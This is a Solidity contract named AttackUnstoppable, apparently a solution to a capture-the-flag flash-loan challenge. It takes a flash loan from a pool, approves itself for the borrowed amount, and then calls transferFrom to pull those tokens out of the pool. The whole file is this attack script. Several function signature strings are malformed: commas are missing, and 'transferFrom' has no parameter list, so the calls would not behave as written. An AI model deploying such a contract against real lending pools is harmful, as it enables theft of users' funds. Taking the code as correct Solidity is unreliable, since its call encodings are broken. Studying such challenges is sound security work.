// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackUnstoppable is IERC3156FlashBorrower {
    using Address for address;
    address private immutable pool;
    address private immutable token;

    constructor(address _pool, address _token) {
        pool = _pool;
        token = _token;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.functionCall(
            abi.encodeWithSignature(
                "approve(address uint256)",
                address(this),
                amount
            )
        );
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint amount) external {
        pool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(address address uint256 bytes)",
                address(this),
                token,
                amount,
                bytes("")
            ),
            "FLASH LOAN"
        );

        token.functionCall(
            abi.encodeWithSignature(
                "transferFrom",
                pool,
                address(this),
                amount
            ),
            "TRANSFER FROM"
        );
    }
}
